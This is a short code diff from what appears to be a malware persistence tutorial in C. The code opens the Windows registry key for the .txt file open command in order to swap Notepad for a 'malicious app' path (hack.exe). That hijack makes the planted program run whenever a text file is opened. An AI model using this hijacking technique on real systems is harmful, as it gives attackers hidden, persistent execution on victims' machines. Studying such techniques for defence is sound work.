@@ -16,7 +16,7 @@ int main(int argc, char* argv[]) {
   // command for replace
   // "%SystemRoot%\\system32\\NOTEPAD.EXE %1"
   // malicious app
-  const char* cmd = "Z:\\2022-08-26-malware-pers-9\\hack.exe";
+  const char* cmd = "Z:\\hack.exe";
 
   // hijacking logic
   LONG res = RegOpenKeyEx(HKEY_CLASSES_ROOT, (LPCSTR)"\\txtfile\\shell\\open\\command", 0 , KEY_WRITE, &hkey);
